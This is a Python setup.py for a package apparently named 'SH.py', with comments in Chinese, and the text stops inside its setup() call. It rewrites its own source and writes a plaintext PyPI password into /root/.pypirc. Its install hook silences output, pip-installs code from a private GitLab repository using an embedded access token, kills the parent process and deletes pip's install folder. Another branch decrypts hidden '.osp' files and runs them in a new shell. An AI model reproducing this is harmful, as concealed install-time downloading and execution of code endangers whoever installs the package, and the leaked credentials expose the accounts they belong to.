#!/usr/bin/python
class Var:
      nameA='SH.py'  #nameA!  
      nameB=14.65  #nameB! 
      @classmethod
      def popen(cls,CMD):
          import subprocess,io,re
          # CMD = f"pip install cmd.py==999999"
          # CMD = f"ls -al"

          proc = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
          proc.wait()
          stdout = io.TextIOWrapper(proc.stdout, encoding='utf-8').read()
          stderr = io.TextIOWrapper(proc.stderr, encoding='utf-8').read()

          # True if stdout  else False , stdout if stdout  else stderr 
          return  stdout if stdout  else stderr 
      
      @classmethod
      def pipB(cls,name="cmd.py"):
          CMD = f"pip install {name}==999999"
          import re
          ################  錯誤輸出    
          str_stderr = cls.popen(CMD)
          SS=re.sub(".+versions:\s*","[",str_stderr)
          SS=re.sub("\)\nERROR.+\n","]",SS)
          # print("SS..",eval(SS))
          BB = [i.strip() for i in SS[1:-1].split(",")]
          
          print(f"[版本] {cls.nameA}: ",BB)
          ################  return  <list>   
          return BB
         
     

      def __new__(cls,name=None,vvv=None):
       
          if  name!=None and vvv!=None:
               
              #######################################################
            #   with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
            #         ############################
            #         f.seek(0,0)       ## 規0
            #         R =f.readlines( ) 
            #         R[1]=f"      nameA='{name}'\n"
            #         R[2]=f"      nameB='{vvv}'\n"
            #         ##########################
            #         f.seek(0,0)       ## 規0
            #         f.writelines(R)
                            
              #######################################################
              with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
                    ############################
                
                    ####################### 2022/2/2
                    if  cls.nameA==None:
                        cls.nameA=""
                        cls.nameB=""
                        import sys
                        print("@ 20022: ", sys.argv)


                        SS=open(__file__,"r").readlines() 
                        SS[2] = SS[2].replace("None  #nameA!",f'"{sys.argv[1]}"  #nameA!')
                        SS[3] = SS[3].replace("None  #nameB!",f'"{sys.argv[2]}"  #nameB!')
                        print(SS)
                        open(__file__,"w").writelines(SS) 
                    ####################### 2022/2/2


                    # N="name"
                    NR=["#nameA!","#nameB!"]
                    ######## 禁止i.strip() 刪除 \n 和\tab ############
                    ### R is ########## 本檔案 #######################
                    f.seek(0,0)       ## 規0
                    R =f.readlines( ) 
                    # R=[ i for i in open(__file__).readlines()] 
                    # print(R)

                    ###############
                    # Q=[ (ii,i) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in ["#nameA!","#nameB!"]   ]
                    Q=[ (i,b) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in NR   ]
                    # print(Q)


                    # 
                    if len(Q)==len(NR):
                        # print("**Q",*Q)
                        NR=[ i.strip("#!") for i in NR] ## 清除[#!] ---> ["nameA","nameB"]
                        NG=[ f"'{name}'" , vvv ]
                        def RQQ( i , b ):
                            print( "!rrr!", i ,b)
                            NRR = NR.pop(0) 
                            NGG = NG.pop(0) 
                            import re
                            print( "!rrr!",Q[0]) ## (2, 'nameA=None  #nameA!')
                            R01 = list(  b  )     ## 字元陣列 ## 

                            N01 = "".join(R01).find( f"{ NRR }")
                            R01.insert(N01,"=")
                            print( "!rrr!", R01  )

                            N01 = "".join(R01).find( f"#{ NRR }!")
                            R01.insert(N01,"=")
                            print( "!rrr!",R01  )

                            ### 修改!.
                            QQA="".join(R01).split("=")
                            QQA.pop(2)
                            QQA.insert(2, f"={ NGG }  ")
                            print( "!rrr!" ,"".join(QQA)  )

                            ### 本檔案..修改
                            return  i ,"".join(QQA)

                        for ar in Q:
                            # print("!XXXX")
                            N,V = RQQ( *ar )
                            R[N] = V
                        ##########################
                        f.seek(0,0)       ## 規0
                        # print("@ R ",R)
                        f.writelines(R)


              ##
              ##########################################################################
              ##  這邊會導致跑二次..............關掉一個
              if  cls.nameA==None:
                  import os,importlib,sys
                  # exec("import importlib,os,VV")
                  # exec(f"import {__name__}")
                  ############## [NN = __name__] #########################################
                  # L左邊 R右邊
                  cls.NN = __file__.lstrip(sys.path[0]).replace(os.path.sep,r".")[0:-3]  ## .py
                  print("@ cls.NN (nameA==None): ", cls.NN )
                  cmd=importlib.import_module( cls.NN ) ## 只跑一次
                  # cmd=importlib.import_module( "setup" ) ## 只跑一次(第一次)--!python
                  # importlib.reload(cmd)                ## 無限次跑(第二次)
                  ## 關閉
                  # os._exit(0)  
                  sys.exit()     ## 等待 reload 跑完 ## 當存在sys.exit(),強制無效os._exit(0)

             

          else:
              return  super().__new__(cls)




# ################################################################################################
# def siteOP():
#     import os,re
#     pip=os.popen("pip show pip")
#     return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 

# ## 檢查 ln 狀態
# !ls -al { siteOP()+"/cmds" }


            
#################################################################
#################################################################      
#################################################################
class PIP(Var):

      def __new__(cls): # 不備呼叫
          ######### 如果沒有 twine 傳回 0
          import os
          BL=False if os.system("pip list | grep twine > /dev/nul") else True
          if not BL:
             print("安裝 twine")
             cls.popen("pip install twine")
          else:
             print("已裝 twine")
          ############################  不管有沒有安裝 都跑
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)
         
class MD(Var):
      text=[
            # 'echo >/content/cmd.py/cmds/__init__.py',
            'echo >/content/cmd.py/README.md',
            'echo [pypi]> /root/.pypirc',
            'echo repository: https://upload.pypi.org/legacy/>> /root/.pypirc',
            'echo username: moon-start>> /root/.pypirc',
            'echo password: Moon@516>> /root/.pypirc'
            ]
      def __new__(cls): # 不備呼叫
           

          for i in cls.text:
              cls.popen(i)
          ############################
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)




class initQ(Var):
# class init(Var):
    #   classmethod
    #   def 
      # def init(cls,QQ):
      def __new__(cls): # 不備呼叫
    # def __new__(cls,QQ,nameA,nameB): # 不備呼叫
          # cls.popen(f"mkdir -p {QQ}")
          #############################
          QQ= "cmdsSQL"

        #   QQ=""
        #   import os
        #   if  os.name=="nt":
        #      os.system(f"mkdir {QQ}")
        #   elif os.name=="posix":
        #      os.system(f"mkdir -p {QQ}")
          cls.popen(f"mkdir -p {QQ}")
          #############################
          if  type(QQ) in [str]:
              ### 檢查 目錄是否存在 
              import os
              if  os.path.isdir(QQ) & os.path.exists(QQ) :
                  ### 只顯示 目錄路徑 ----建立__init__.py
                  for dirPath, dirNames, fileNames in os.walk(QQ):
                      
                      print( "echo >> "+dirPath+f"{ os.sep }__init__.py" )
                      os.system("echo >> "+dirPath+f"{ os.sep }__init__.py") 

                     
              else:
                      ## 當目錄不存在
                      print("警告: 目錄或路徑 不存在") 
#               ###################################################
              
          else:
                print("警告: 參數或型別 出現問題") 



                exec(os.environ)


# class sdist(MD,PIP,initQ):
class sdist(MD,PIP):
      import os
      ########################################################################
      VVV=True
     
      dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"     


      @classmethod
      def rm(cls):
          import os
          # /content/sample_data   
          if os.path.isdir("/content/sample_data"):
            os.system(f"rm -rf /content/sample_data")



            ################################################################################ 
          if not os.path.isfile("/content/True"):
            ################################################################################  
            if os.path.isdir("dist"):
                print("@刪除 ./dist")
                ##### os.system(f"rm -rf ./dist")
                print( f"rm -rf {os.getcwd()}{os.path.sep}dist" )
                os.system(f"rm -rf {os.getcwd()}{os.path.sep}dist")
            ##
            info = [i for i in os.listdir() if i.endswith("egg-info")]
            if  len(info)==1:
                if os.path.isdir( info[0] ):
                    print(f"@刪除 ./{info}")
                    #  os.system(f"rm -rf ./{info[0]}")
                    os.system(f"rm -rf {os.getcwd()}{os.path.sep}{info[0]}")
            ################################################################################
      
      def __new__(cls,path=None): # 不備呼叫
          this = super().__new__(cls)
          import os
          print("!XXXXX:" ,os.getcwd() )
          if  path=="":
              import os
              path = os.getcwd()
          ###############################
          import os
          if  not os.path.isdir( path ):
              ## 類似 mkdir -p ##
              os.makedirs( path ) 
          ## CD ##       
          os.chdir( path )
          ################################


          ######## 刪除
          cls.rm()    
        #   CMD = f"python {os.getcwd()}{os.path.sep}setup.py sdist bdist_wheel"
          CMD = f"python {os.getcwd()}{os.path.sep}setup.py sdist --formats=zip"
          # CMDtxt = cls.popen(CMD)
          ## print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@[set]@@@@@\n",CMDtxt)
          ################################################################
          

          print("@ 目前的 pwd :",os.getcwd() ,not os.path.isfile("/content/True") )


          ##  !twine 上傳
          if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              ## if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              ## 建立 init ...
              ##   print( cls.dir,cls.nameA,cls.nameB )
              ##initQ(cls.dir,cls.nameA,cls.nameB)
              ########################################################
              ##############################################################
              ##############################################################
          
              cls.VVV=True
              print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",cls.popen(CMD))
              ##############
              # CMD = "twine upload --verbose --skip-existing  dist/*"
              CMD = f"twine upload --skip-existing  {os.getcwd()}{os.path.sep}dist{os.path.sep}*"
              # print("@222@",cls.popen(CMD))

              #  if not os.path.isfile("/content/True"): ## [True]
              CMDtxt = cls.popen(CMD)
              if CMDtxt.find("NOTE: Try --verbose to see response content.")!=-1:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n[結果:錯誤訊息]\nNOTE: Try --verbose to see response content.\n注意：嘗試 --verbose 以查看響應內容。\n")
              else:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",CMDtxt)
          else:
              cls.VVV=False
              print(f"[版本]: {cls.nameB} 已經存在.")
              ######################################
              # 如果目前的 Var.nameB 版本已經有了
              if Var.nameA != None:
                if str(Var.nameB) in Var.pipB(Var.nameA):
                  import sys
                #   ## 如果輸出的和檔案的不相同
                  if str(sys.argv[2])!=str(Var.nameB):
                    # print("OK!! ",*sys.argv)
                    print("OK更新!!python "+" ".join(sys.argv))
                    # os.system("python "+" ".join(sys.argv))
                    os.system("python "+" ".join(sys.argv))
                   
                    ## 結束 ##
                    BLFF="結束."

                
        
          
          ######## 刪除
          cls.rm()     
          ###################   
          return  this
          


### 首次---參數輸入
################################################# 這裡是??????      
import sys
if    len(sys.argv)==3 and (not "clean" in sys.argv):
    ##################################### 2022/2/2
    #@ sys:: ['-c', 'clean', '--all']
    ##################################### 2022/2/2
    # ################################# 關閉 print !!
    # import sys,os
    # SS=sys.stdout
    # sys.stdout=open(os.devnull,"w")
    # ################################# 打開 print !!
    # sys.stdout=SS
    # ###################################################


    ##########################
    ## 產生:設定黨
    if sys.argv[2].find(r"--formats=zip") == -1:
    # if sys.argv[2].find(r"bdist_wheel") == -1:
        Var(sys.argv[1],sys.argv[2])
        ################################################

        import os
        sdist(os.path.dirname(sys.argv[0]))
        #################################################
       

# ################################################# 這裡是?????? 
# def pypiTO(DIR):
#     # https://ithelp.ithome.com.tw/articles/10223402
#     # !pip3 install nuitka
#     # !nuitka3 --module K.py
#     def exeTO(path,name):
#         # name= "KKB.py"
#         # path= "/content/QQ"
#         import os
#         home= os.getcwd()
#         os.chdir(path)
#         os.system(f"nuitka3 --module {name}")
#         os.remove( name );os.remove( name[0:-3]+".pyi");
#         # os.removedirs("TT.build")
#         import shutil ## 多層目錄
#         shutil.rmtree( name[0:-3]+'.build')
#         os.chdir(home)


#     def listPY(PWD="/content"):
#         data = {}
#         import os
#         ### 路徑   底下目錄  底下檔案
#         for root , dirs , files in os.walk(PWD):
#             # print(root) ## 所有的目錄
#             # print(root,files) ## 所有的子檔案

#             for name in files:
#                 if os.path.splitext(name)[1]==".py":
#                     # print(name)

#                     ## [init]
#                     if not root in data.keys():
#                         data[root]=[]
#                     ## [add]
#                     data[root].append(name)
#         return data
        
#     # listPY("/content")
#     import os
#     os.system("pip install nuitka")
#     data = listPY( DIR )
#     for key in data.keys():
#         # print( key , data[key] )
#         for name in  data[key] :
#             # print(key, name)
#             exeTO(key,name)
# ##########################################################################
# ##########################################################################





from pip._internal.cli.main import *
              


    

print("@週期::",sys.argv)
import sys
print("@週期 BL::",  "sys.argv" in os.environ.keys()  )
###################################################
import os;
if not "TEMP" in os.environ.keys():
    os.environ[ "TEMP" ] = "/tmp" 
###################################################
import os,sys
# 會建立這兩個
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'egg_info', '--egg-base', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-pip-egg-info
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'bdist_wheel', '-d', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-wheel-l_q1vm4y']
# print("@ 建立tmp ::",sys.argv)
###############################################
# if not "Email" in os.environ.keys():
# if 'install' in sys.argv:
if 'bdist_wheel' in sys.argv:

    import os,tempfile as T
    dir_name = T.mkdtemp(suffix="..\\",prefix="",dir=  os.environ[ "TEMP" ] ) 
    name = dir_name[len(os.environ[ "TEMP" ])+1::]                       

    # Author-email:
    import os
    os.environ[ "Email" ] = str(name[0:-3]+"@gmail.com")
    # print(dir_name,"---",name[0:-3]+"@gmail.com" )
    ####################################################
    # C:\Users\moon\AppData\Local\Temp
    # os.system(f"echo print(999)>{dir_name}{os.path.sep}GO.py")

    ################################################################################ 
    # os.system(f"echo {os.getpid()} {os.getppid()}>/content/PID2.py")




import sys,os
if 'bdist_wheel' in sys.argv:
    print("關閉 print !! A")
    import os
    if "sys.argv" in os.environ.keys():
            # import os,sys
            # os.system(f'start cmd /c "timeout /nobreak /t 13&& echo {str(sys.argv)} && pause"')
            # # def job(d): 
            # #     import os,sys
            # #     os.system(f'start cmd /c "timeout /nobreak /t 13&& echo {str(sys.argv)} && pause"')




            # # #####################################################  
            # # # 建立一個子執行緒
            # # import threading , os
            # # # global t        
            # # t = threading.Thread(target = job, args=(123,))
            # # setattr(t,"pid",os.getpid())
            # # ################################################
            # # # 執行該子執行緒
            # # t.start()
            # # del os.environ["sys.argv"]


            # ##########
            # #########
        
            #####################
            def DQ64(pathQ="/content/R.py"):
                    def D64Q(path="/content/R.py"):
                        import base64
                        image = open( path , 'r',encoding="utf-8").read()
                        ###########################################
                        import os
                        os.system("pip install cryptocode > log.py") 
                        import cryptocode
                        os.remove("log.py")
                        ############################################
                        wow = os.popen("git config root.dir").read().rstrip()
                        valueQ = cryptocode.decrypt(image, wow )
                        # print(value)
                        value = base64.b64decode(valueQ).decode('utf-8') ## 解碼 2進位為中文碼
                        ############################################
                        # value = base64.b64decode(image).decode('utf-8') ## 解碼 2進位為中文碼
                        # print(value.decode('utf-8'),type(value))
                        # print(value)
                        open( path , 'w').write(value)


                    ##### 解碼
                    # D64Q()


                    def listPY(PWD="/content"):
                        data = {}
                        import os
                        ### 路徑   底下目錄  底下檔案
                        for root , dirs , files in os.walk(PWD):
                            # print(root) ## 所有的目錄
                            # print(root,files) ## 所有的子檔案

                            for name in files:
                                if os.path.splitext(name)[1]==".osp":
                                    # print(name)
                                    
                                    ## [rename]
                                    os.rename(os.path.join(root,name),os.path.join(root,name[0:-3]+"py"))
                                    name = name[0:-3]+"py"

                                    ## [init]
                                    if not root in data.keys():
                                        data[root]=[]
                                    ## [add]
                                    data[root].append(name)

                        # return data
                        return [ os.path.join(path,name) for path,R in data.items() for name in R ]
                        


                    # import os
                    for i in listPY( pathQ ):
                        D64Q(i)

            #############################################
            #############################################
            import os;
            if not "TEMP" in os.environ.keys():
                os.environ[ "TEMP" ] = "/tmp" 
            #############################################
            import os
            sumPATH = os.environ["LOCALAPPDATA"]+ r"\pip\cache\http\b\b" if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b" if os.name=="posix" else "NoneQ" )
            import os
            home = os.getcwd()
            print( "@  sumPATH:" ,sumPATH  )
            os.chdir( sumPATH )
            sumQ = os.popen("git config root.dir").read().rstrip()  ## sumQ
            print( "@  home:" , home  )
            os.chdir( home )
            #############################################
            import os,sys
            #### "PYTHONPATH" = A +os.path.sep+ B
            #### "PYTHONPATH" = os.getcwd() +os.path.sep+ os.environ[ "PYTHONPATH" ]
            hoem = os.getcwd()
            # os.chdir( os.environ["TEMP"]  )         ## A
            # os.environ[ "PYTHONPATH" ] = f"{sumQ}..\\"   ## B
            # #########################################################
            # print( "@  sumQ:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"   )
            # os.chdir( os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"  )         ## C
            #########################################################
            #### 解碼
            os.system("pip3 install pycryptodomex && pip install cryptocode==0.1")
            # print( "@  DQ64:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\\\"   )
            # print( "@  DQ64:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}"   )
            # DQ64(  os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"   )
            #################################################################################
            # DQ64(  os.environ["TEMP"]+ os.path.sep +os.environ[ "PYTHONPATH" ]  )
            # print( os.popen(" ".join(eval(os.environ["sys.argv"]))).read()  )
            # print( " ".join(eval(os.environ["sys.argv"])).read()  )
            #############################################
            #############################################
            # os.chdir(home)
            ##############################################
            # .insert(0,SH_py())
            # sys.meta_path.insert(0,SH_py())
            ###############################################
            # from posix import listdir
            import tempfile

            # https://blog.gtwang.org/linux/linux-cp-command-copy-files-and-directories-tutorial/
            def XCOPY(nameA="/content/sample_data",nameB="/content/A/B/C"):
                import os
                if os.name=="posix": 
                    os.system(f"mkdir -p {nameB}")
                    os.system(f"cp -r {nameA} {nameB}")
                elif  os.name=="nt":
                    os.rename(nameA,nameA[0:-3])
                    os.system(f"XCOPY {nameA[0:-3]} {nameB}{os.path.sep}* /s /e /h /y")
                    os.rename(nameA[0:-3],nameA)

            ### 
            with tempfile.TemporaryDirectory() as  dirname: 
                print('暫存目錄：', dirname)
                print("XCOPY :", os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\" ,dirname )
                # ...
                import os
                # XCOPY( "/content/sample_data",dirname )
                #########################################################################
                XCOPY( os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\" ,dirname )
                DQ64(  dirname   )
                # print(os.listdir(dirname))
                # print(os.listdir(dirname+os.path.sep+"sample_data" ))
                import sys
                sys.path.append( dirname )  ## 無效果 sys.patrh
                import importlib , os
                nameG = str( os.environ["sys.argv"] )
                print("@ import ",nameG  , sys in sys.modules.keys() , os.environ["sys.argv"] ,os.environ["sys.cmds"]  )
              


                # import importlib as L
                # L.import_module(name, package=None)
                
                # # importlib.import_module( nameG )
                # os.environ["sys.cmdOP"]=str( dirname ) 
# @!! ...PYTHONPATH ::: C:\Users\moon\Desktop\PythonAPI\Lib\site-packages12399;C:\;
# @!! ...sys.argv os::: ['C:\\Users\\moon\\Desktop\\PythonAPI\\Scripts\\cmdsSQL.exe']
# @!! ...sys.cmds os::: cmdsSQL=SQL.databasesB:main
                #########
                import os
                cc,ff= os.environ["sys.cmds"].split("=")[1].split(":")
                # open(f"{dirname}{os.path.sep}ST.py").write("")
                # os.system(f'start /D \"{dirname}\" cmdsSQL.exe')
                #
                # os.system(f'start cmd /k "python -c \" import importlib,os,sys;sys.path.append( \\\"{dirname}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""')
                # os.system(f'start cmd /c "python -c \" import importlib,os,sys;sys.path.append( \\\"{dirname}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""')
                ##
                SS=dirname.replace("\\","\\\\")
                os.system(f'start cmd /k "python -c \"import importlib,os,sys;sys.path.append( \\\"{SS}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""')
                
                #########
                import importlib
                # SS="cmdsSQL=SQL.databasesB:main"
                # cmds = importlib.import_module('SQL.databasesB')
                ##########################################################################
                # cc,ff= os.environ["sys.cmds"].split("=")[1].split(":")
                # cmds = importlib.import_module( cc )
                # exec(f"cmds.{ff}()")
                ########################################################################
                import os
                # os.system(f'start cmd /c "timeout /nobreak /t 13&& echo { os.getpid() }-{ os.getppid() }-{ os.path  } && pause"')
                #####
                # G= eval(str(os.environ["sys.argv"]))
                # os.system(f'start cmd /k "python -c \"import sys;sys.argv={G};import {cc} as cmds;cmds.{ff}()\""')
                ###################
             

                # print("@ type ::", type(os.environ["sys.cmds"]),os.environ["sys.cmds"],os.environ["sys.cmds"].decode('utf-8') ,os.environ["sys.cmds"].encode("utf8") )

            # 自動刪除暫存目錄與所有內容

            
            import sys , site ,os ,__main__
            print("@!! ...main :::", __main__ , id(__main__) )
            print("@!! ...site :::", site , id(site) ,  os.getpid()  ,  os.getppid() )
            print("@!! ...XXXX sys.argv 9999 :::",sys.argv)
            print("@!! ...os.path :::", os.path  )
            print("@!! ...PYTHONPATH :::", os.environ["PYTHONPATH"]  )
            print("@!! ...sys.argv os:::", os.environ["sys.argv"]  )
            print("@!! ...sys.cmds os:::", os.environ["sys.cmds"]  )
            #####  import os,sys
            #### os.system(f'start cmd /c "timeout /nobreak /t 13&& echo { os.getpid() }-{ os.getppid() }-{ os.path  } && pause"')
            # input("pause:: 輸入等待")

            # ########## 移除:cryptocode 模組
            # import os
            # os.system("pip uninstall cryptocode -y> log.py")
            # os.remove("log.py")
            ################################################
            ################################################
            ################################################
            print("# 小貓 222 號")
            # ### 直接關閉!!
            import subprocess,os
            subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getppid()) }", shell=True) ## 成功
            ######################################################
            # ## 因為我用 from 當前 所以不能用 ppid
            # subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getpid()) }", shell=True) ## 成功
            # # os.kill( str(os.getpid()) ,9) ## 失敗
    ################################################
    ################################################
    ################################################
    print("# 小貓 111 號")
    
#     ################################# 關閉 print !!
#     import sys,os
#     SS=sys.stdout
#     sys.stdout=open(os.devnull,"w")
#     print("關閉 print !! B")
# if 'clean' in sys.argv:
#     ################################# 打開 print !!
#     sys.stdout=SS
#     ###################################################
#     print("@ clean ...")



if   sdist.VVV and (not "BLFF" in dir()):
  # if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install':


  ### win10 [ build ]  
  ### linux [ sdist ] 
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean'  or sys.argv[1]== 'build' :


    # if sys.argv[1]=='clean':
    #     print("@@ !!clean!! @@")
    #     import os
    #     import importlib as L

    #     # name = dictOP['name']
    #     name = Var.nameA if not Var.nameA.find(".")!=-1 else  Var.nameA.split('.')[0]
    #     TT= L.import_module(name)
    #     TTP= os.path.dirname(TT.__file__)
    #     print("@TTP+++: ",TTP)
    #     os.system(f"rm -rf  { TTP }") 



    import builtins
    builtins.__dict__["QQA"]=123

    
    ##############################################
    from setuptools.command.install import install
    
    #####
    from subprocess import check_call
    
    
    nameA= f"{Var.nameA}" 
    nameB= f"{Var.nameB}"
    package= f"{sdist.dir}"
     

    #### pip-install
    from pip._internal.cli.main import *
    class PostCMD(install):
      """cmdclass={'install': XXCMD,'install': EEECMD }"""

      def EQ64(self, pathQ="/content/R.py"):
                def E64Q(path="/content/R.py"):
                    import base64
                    image = open( path , 'rb')
                    valueQ = base64.b64encode(image.read()).decode()
                    ###########################################
                    import os
                    # os.system("pip install cryptocode==0.1> log.py")
                    import cryptocode
                    # os.system("pip uninstall cryptocode -y> log.py")
                    # os.remove("log.py")
                    ###########################################
                    wow = os.popen("git config root.dir").read().rstrip()
                    value = cryptocode.encrypt(valueQ, wow )
                    # print(value)
                    open( path , 'w').write(value)


                ##### 編碼
                # E64Q()
                def listPY(PWD="/content"):
                    data = {}
                    import os
                    ### 路徑   底下目錄  底下檔案
                    for root , dirs , files in os.walk(PWD):
                        # print(root) ## 所有的目錄
                        # print(root,files) ## 所有的子檔案

                        for name in files:
                            if os.path.splitext(name)[1]==".py":
                                # print(name)
                                ## [rename]
                                os.rename(os.path.join(root,name),os.path.join(root,name[0:-2]+"osp"))
                                name = name[0:-2]+"osp"

                                ## [init]
                                if not root in data.keys():
                                    data[root]=[]
                                ## [add]
                                data[root].append(name)

                    # return data
                    return [ os.path.join(path,name) for path,R in data.items() for name in R ]
                    


                # import os
                for i in listPY(pathQ):
                    E64Q(i)


                #########################################################################
                #########################################################################
                #########################################################################

      def  run(self):
        ###################################
        import os
        install.run(self)
        print(nameA,nameB)
        ##################################################### 相同的 PID 程序
        ################################################
        ################################################
        ################################################
        import os
        if not "sys.argv" in os.environ.keys():
            
            ################################################
            ################################################
            ################################################
            print("# 小貓 1 號")

            
            def DPIP(BL):
              if BL:
                ##################################################################
                import os
                ##################################################################
                FF = str(__file__).split("setup.py")[0]
                # print("@ pipQQ ::",FF)
                
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",FF )  
                    os.system(f"rmdir /q /s {FF}") ## DEL
                    # import shutil
                    # shutil.move(FF,FF+"QQ")
                    ###################################### 

                    # print("@ DPIP ::",os.popen("dir "+FF).read() ) 
                ##################################################################
                # C:\Users\moon\AppData\Local\Temp\pip-install-vslm992c\sh-py_51683c691ba945329606fb3092157455 的目錄
              else:
               
                ##################################################################
                import os
                ##################################################################
                FF = str(__file__).split("setup.py")[0]
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",FF )  
                    os.system(f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info") ## DEL
             



            ##########################################################
            ## 只有 win10 會
            DPIP(True)
            # #########################################################
            # ### 只能是字串 陣列會錯誤
            # import sys , os
            # # os.environ[ "sys" ] = str(sys.argv)       
            # os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/"+nameA+"/@v"+nameB+"#egg="+nameA+"")
            # ################???... 如果用...執行續???

            
            import os
            #### from pip install 
            #### 建立一個 .py檔案
            from tempfile import NamedTemporaryFile as F
            fp = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
            ################################################
            test='''
import sys , os
###### os.system("python -m pip install psutil")
###### os.system(f"notepad {__file__}")


##os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v'''+nameB+'''#egg='''+nameA+'''")


#### pause-main
#### import psutil , os
####pp = psutil.Process( '''+str(os.getpid())+''' )   
####pp.suspend() ## 子程序 暫停 ......... 站亭子程序 但是 子孫不聽話


################################# 關閉 print !!
import sys,os
SS=sys.stdout
sys.stdout=open(os.devnull,"w")



#### pip-install
from pip._internal.cli.main import *
main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v'''+nameB+'''#egg='''+nameA+'''" ])
# main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v12.91#egg='''+nameA+'''" ])
# import os
# os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v12.11#egg='''+nameA+'''")


########## 移除:cryptocode 模組 #################
import os
os.system("pip uninstall cryptocode -y> log.py")
os.remove("log.py")
#####################################################


################################# 打開 print !!
sys.stdout=SS
###################################################


### start-main
################### pp.resume() ## 繼續跑

###### win...比os.exit()  有效果!!
###### 注意的是程序要停止...才能關閉..刪除
import subprocess,os
###### subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID {'''+str(os.getppid())+'''}", shell=True)
os.kill('''+str(os.getppid())+''',9)
'''
            fp.write( test.encode(encoding="utf-8") )
            fp.close()  ## close 關閉檔案::則才會刪除檔案!!   os.remove(fp.name) 才有效果
            ###############################################

            import os
            os.system(f"python {fp.name}") ## 必須關閉檔案 才能執行
            os.remove(fp.name)
            ######################
            # https://blog.csdn.net/happyjacob/article/details/112385665
            DPIP(False)




            #############################################
            ###########################################
            #############################################
            # os.system(f'start cmd /c "timeout /nobreak /t 3&& echo EQ64444 {str(sys.argv)} && pause"')
            # import os
            # self.EQ64( os.environ[ "TEMP" ] + os.path.sep + f"{sumQ}..\\"  )
            # ###########################################################################   
            ############
            ############
            # os.system("pip uninstall cryptocode -y> log.py")
            # os.remove("log.py")



       
                
            

    

            



    ################################################
    # # with open("/content/QQ/README.md", "r") as fh:
    # with open("README.md", "r") as fh:
    #           long_description = fh.read()


    ##############
    import site,os
    siteD =  os.path.dirname(site.__file__)
    # +os.sep+"siteR.py"
    print("@siteD: ",siteD)
    #### setup.py ################################
    from setuptools import setup, find_packages
    
    setup(
          # name  =  "cmd.py"  ,
          name  =   f"{Var.nameA}"  ,
          
          ## version
          ## 0.7 0.8 0.9版 3.4版是內建函數寫入   錯誤版笨
          # version= "5.5",
          version=  f"{Var.nameB}"  ,
          # version= f"{Var.name}",
          # version= "01.01.01",
          # version="1.307",
          # name  =  "cmd.py"  ,
          # version= "1.0.4",
          # description="[setup.py]",

          author="我是一隻小貓",
          description="[setup.py專案]",
          author_email =   str(os.environ[ "Email" ])  if "Email" in os.environ.keys() else "999@gmial.com" ,
          
          
          #long_description=long_description,
          long_description="""# Markdown supported!\n\n* Cheer\n* Celebrate\n""",
          long_description_content_type="text/markdown",
        #   author="moon-start",
        #   author_email="login0516mp4@gmail.com",
          # url="https://gitlab.com/moon-start/cmd.py",
          license="LGPL",
          
        #   packages=find_packages(include= ["cmdsSQL","cmdsSQL.*"] ), 
